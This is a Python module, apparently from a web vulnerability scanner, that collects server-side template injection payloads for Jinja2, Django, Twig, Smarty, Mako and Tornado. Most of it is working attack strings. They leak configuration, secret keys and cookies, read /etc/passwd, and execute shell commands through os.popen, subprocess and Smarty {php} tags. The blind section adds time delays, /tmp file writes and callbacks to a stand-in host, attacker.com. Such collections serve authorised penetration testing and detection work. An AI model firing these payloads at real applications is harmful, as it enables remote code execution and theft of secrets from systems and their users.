"""
SSTI (Server-Side Template Injection) payload collection
"""

from typing import List, Dict, Any

class SSTIPayloads:
    """SSTI payload collection"""
    
    @staticmethod
    def get_basic_payloads() -> List[str]:
        """Get basic SSTI payloads"""
        return [
            # Mathematical expressions
            '{{7*7}}',
            '${7*7}',
            '#{7*7}',
            '%{7*7}',
            '{{8*8}}',
            '${8*8}',
            '{{7*7*7}}',
            '${7*7*7}',
            
            # Template engine specific
            '{{config}}',
            '${config}',
            '{{request}}',
            '${request}',
            '{{session}}',
            '${session}',
            
            # Jinja2 specific
            '{{config.items()}}',
            '{{request.environ}}',
            '{{request.args}}',
            '{{request.form}}',
            '{{request.cookies}}',
            
            # Django specific
            '{{settings.SECRET_KEY}}',
            '{{request.META}}',
            '{{request.user}}',
            
            # Twig specific
            '{{app.request}}',
            '{{app.session}}',
            '{{dump(app)}}',
            
            # Smarty specific
            '{$smarty.version}',
            '{$smarty.server}',
            '{$smarty.get}',
            '{$smarty.post}',
            
            # Mako specific
            '${self}',
            '${context}',
            '${request}',
            
            # Tornado specific
            '{{handler.request}}',
            '{{handler.application}}'
        ]
    
    @staticmethod
    def get_rce_payloads() -> List[str]:
        """Get RCE SSTI payloads"""
        return [
            # Jinja2 RCE
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "{{request.__class__.__init__.__globals__['os'].popen('whoami').read()}}",
            "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
            "{{config.__class__.__init__.__globals__['os'].listdir('.')}}",
            
            # Django RCE
            "{{request.__class__.__init__.__globals__.os.popen('id').read()}}",
            "{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.os.popen('whoami').read()}}",
            
            # Twig RCE
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            "{{_self.env.enableDebug()}}{{_self.env.enableAutoReload()}}",
            
            # Smarty RCE
            "{php}echo `id`;{/php}",
            "{php}system('whoami');{/php}",
            "{php}phpinfo();{/php}",
            
            # Mako RCE
            "${__import__('os').popen('id').read()}",
            "${__import__('subprocess').check_output('whoami', shell=True)}",
            
            # Tornado RCE
            "{{handler.request.__class__.__init__.__globals__['os'].popen('id').read()}}"
        ]
    
    @staticmethod
    def get_detection_payloads() -> List[str]:
        """Get SSTI detection payloads"""
        return [
            # Simple math expressions
            '{{7*7}}',
            '${7*7}',
            '#{7*7}',
            '%{7*7}',
            '{{8*8}}',
            '${8*8}',
            '{{9*9}}',
            '${9*9}',
            
            # Polyglot payloads
            '${{7*7}}',
            '#{{7*7}}',
            '%{{7*7}}',
            '{{7*\'7\'}}',
            '${7*\'7\'}',
            
            # Error-inducing payloads
            '{{undefined_variable}}',
            '${undefined_variable}',
            '{{7/0}}',
            '${7/0}',
            '{{[].__class__}}',
            '${[].__class__}',
            
            # Template syntax variations
            '{%7*7%}',
            '<%=7*7%>',
            '<#assign x=7*7>${x}',
            '{{7*7|safe}}',
            '${7*7?c}',
            
            # URL encoded versions
            '%7B%7B7*7%7D%7D',
            '%24%7B7*7%7D',
            '%23%7B7*7%7D'
        ]
    
    @staticmethod
    def get_blind_payloads() -> List[str]:
        """Get blind SSTI payloads"""
        return [
            # Time-based payloads
            "{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['time'].sleep(5)}}",
            "${__import__('time').sleep(5)}",
            "{{config.__class__.__init__.__globals__['time'].sleep(5)}}",
            
            # DNS/HTTP callback payloads
            "{{config.__class__.__init__.__globals__['urllib2'].urlopen('http://attacker.com/ssti')}}",
            "${__import__('urllib2').urlopen('http://attacker.com/ssti')}",
            "{{request.__class__.__init__.__globals__['requests'].get('http://attacker.com/ssti')}}",
            
            # File system interaction
            "{{''.__class__.__mro__[2].__subclasses__()[40]('/tmp/ssti_test', 'w').write('test')}}",
            "${__import__('os').system('touch /tmp/ssti_test')}",
            
            # Error-based blind detection
            "{{7/0 if config else 1}}",
            "${7/0 if request else 1}",
            "{{undefined_var.nonexistent_method()}}"
        ]
    
    @staticmethod
    def get_all_payloads() -> List[str]:
        """Get all SSTI payloads"""
        payloads = []
        payloads.extend(SSTIPayloads.get_basic_payloads())
        payloads.extend(SSTIPayloads.get_detection_payloads())
        payloads.extend(SSTIPayloads.get_rce_payloads()[:10])  # Limit RCE payloads
        payloads.extend(SSTIPayloads.get_blind_payloads()[:5])  # Limit blind payloads
        return payloads
    
    @staticmethod
    def get_engine_specific_payloads() -> Dict[str, List[str]]:
        """Get template engine specific payloads"""
        return {
            'jinja2': [
                '{{config}}',
                '{{request}}',
                '{{config.items()}}',
                '{{request.environ}}',
                "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
            ],
            'django': [
                '{{settings.SECRET_KEY}}',
                '{{request.META}}',
                '{{request.user}}',
                "{{request.__class__.__init__.__globals__.os.popen('id').read()}}"
            ],
            'twig': [
                '{{app.request}}',
                '{{app.session}}',
                '{{dump(app)}}',
                "{{_self.env.registerUndefinedFilterCallback('exec')}}"
            ],
            'smarty': [
                '{$smarty.version}',
                '{$smarty.server}',
                '{$smarty.get}',
                "{php}echo `id`;{/php}"
            ],
            'mako': [
                '${self}',
                '${context}',
                '${request}',
                "${__import__('os').popen('id').read()}"
            ],
            'tornado': [
                '{{handler.request}}',
                '{{handler.application}}',
                "{{handler.request.__class__.__init__.__globals__['os'].popen('id').read()}}"
            ]
        }
